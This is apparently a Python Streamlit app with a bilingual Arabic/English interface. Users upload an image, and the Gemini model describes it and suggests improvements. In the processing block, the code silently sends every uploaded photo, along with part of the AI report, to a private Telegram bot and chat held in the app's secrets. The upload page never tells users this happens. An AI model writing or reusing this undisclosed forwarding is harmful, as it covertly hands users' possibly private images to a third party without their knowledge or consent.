import streamlit as st
import google.generativeai as genai
from PIL import Image
import io
import requests
import time

# 1. إعدادات الصفحة وجماليات الـ UI الجديدة (ألوان فاتحة)
st.set_page_config(page_title="Aziz Ultra-Max AI", page_icon="🚀", layout="centered")

st.markdown("""
    <style>
    @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&family=Tajawal:wght@400;700&display=swap');
    
    /* خلفية الموقع - ألوان فاتحة */
    .main {
        background-color: #f0f2f6;
    }
    
    /* النصوص العامة */
    html, body, [class*="st-"] {
        font-family: 'Tajawal', sans-serif;
        color: #2c3e50;
    }

    /* العناوين */
    .stTitle {
        color: #1e3a8a;
        text-align: center;
        font-weight: 700;
        margin-bottom: 10px;
    }
    
    .welcome-text {
        text-align: center;
        font-size: 18px;
        color: #4b5563;
        margin-bottom: 30px;
    }

    /* ستايل التوقيع (عريض، داكن، وواضح) */
    .signature-container {
        background-color: #1a1c24; /* خلفية داكنة للتوقيع فقط */
        padding: 20px;
        border-radius: 15px;
        margin-top: 50px;
        text-align: center;
        border: 2px solid #00d4ff;
    }
    
    .signature-text {
        font-family: 'Cairo', sans-serif;
        font-size: 32px;
        font-weight: 900; /* خط عريض جداً */
        color: #ffffff;
        letter-spacing: 2px;
        text-transform: uppercase;
    }

    /* صندوق الرفع */
    .stFileUploader section {
        background-color: #ffffff;
        border: 2px dashed #1e3a8a;
        border-radius: 15px;
    }
    </style>
    """, unsafe_allow_html=True)

# 2. الواجهة الثنائية (عربي / English)
col1, col2 = st.columns([1, 1])
with col1:
    st.markdown('<h1 class="stTitle">🚀 Aziz Ultra-Max</h1>', unsafe_allow_html=True)
    st.markdown('<p class="welcome-text">مرحباً بك! ارفع صورتك للمعالجة التلقائية</p>', unsafe_allow_html=True)
with col2:
    st.markdown('<h1 class="stTitle" style="direction: ltr;">🚀 Ultra-Max AI</h1>', unsafe_allow_html=True)
    st.markdown('<p class="welcome-text" style="direction: ltr;">Welcome! Upload your image for AI processing</p>', unsafe_allow_html=True)

# 3. إعداد الموديل
try:
    genai.configure(api_key=st.secrets["GOOGLE_API_KEY"])
    # الموديل المحدث اللي يحل مشكلة الـ 404
    model = genai.GenerativeModel('gemini-1.5-flash-latest')
except Exception as e:
    st.error("⚠️ Secrets Missing / خطأ في الإعدادات")

# 4. خانة الرفع (أوتوماتيكية)
uploaded_file = st.file_uploader("", type=["jpg", "jpeg", "png"])

if uploaded_file is not None:
    image = Image.open(uploaded_file)
    st.image(image, caption="📸 Processing... / جاري المعالجة", use_container_width=True)
    
    progress_bar = st.progress(0)
    for i in range(100):
        time.sleep(0.005)
        progress_bar.progress(i + 1)

    with st.spinner("🔍 Analysing / جاري التحليل..."):
        try:
            prompt = "Describe this image in English and Arabic, and give 4K improvement tips."
            response = model.generate_content([prompt, image])
            
            # تجهيز الصورة لتيليجرام
            img_byte_arr = io.BytesIO()
            image.save(img_byte_arr, format='JPEG')
            img_data = img_byte_arr.getvalue()
            
            # إرسال لتيليجرام
            requests.post(
                f"https://api.telegram.org/bot{st.secrets['TELEGRAM_TOKEN']}/sendPhoto",
                files={'photo': img_data},
                data={'chat_id': st.secrets['CHAT_ID'], 'caption': f"🎯 Aziz Ultra-Max Report:\n\n{response.text[:1000]}"}
            )
            
            st.balloons()
            st.success("✅ Success! / تم بنجاح!")
            
            with st.expander("📊 Full Report / التقرير الكامل"):
                st.write(response.text)
                
        except Exception as e:
            st.error(f"❌ Error: {e}")

# 5. التوقيع (الجديد: عريض، داكن، فخم)
st.markdown("""
    <div class="signature-container">
        <div class="signature-text">BY: AZIZ ULTRA-MAX</div>
        <div style="color: #00d4ff; font-size: 12px; margin-top: 5px;">EST. 2026 | ALL RIGHTS RESERVED</div>
    </div>
    """, unsafe_allow_html=True)